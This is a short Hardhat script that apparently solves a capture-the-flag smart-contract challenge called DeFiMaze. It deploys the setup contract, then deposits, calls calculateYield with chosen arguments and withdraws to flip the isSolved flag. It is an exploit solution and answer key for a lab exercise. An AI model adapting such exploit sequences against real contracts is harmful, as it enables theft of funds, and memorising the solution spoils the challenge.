const { ethers } = require("hardhat");
require('dotenv').config();

function sleep (time) {
    return new Promise((resolve) => setTimeout(resolve, time));
}

async function main() {

    let [deployer, user] = await ethers.getSigners();
    const provider = ethers.provider
    const SetUpDeFiMaze = await ethers.getContractFactory("SetUpDeFiMaze", deployer);
    const setUpDeFiMaze = await SetUpDeFiMaze.deploy();

    const DeFiPlatform = await ethers.getContractFactory("DeFiPlatform")
    const defiPlatform = new ethers.Contract(await setUpDeFiMaze.platfrom(), DeFiPlatform.interface, provider)

    const Vault = await ethers.getContractFactory("Vault")
    const vault = new ethers.Contract(await setUpDeFiMaze.vault(), Vault.interface, provider)

    console.log("isSolved", await setUpDeFiMaze.isSolved());
    await defiPlatform.connect(user).depositFunds(ethers.utils.parseEther("7"), {"value":ethers.utils.parseEther("7")});
    await defiPlatform.connect(user).calculateYield(1, 1, 1)
    await defiPlatform.connect(user).requestWithdrawal(ethers.utils.parseEther("7"))
    await vault.connect(user).isSolved();
    console.log("isSolved", await setUpDeFiMaze.isSolved());
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});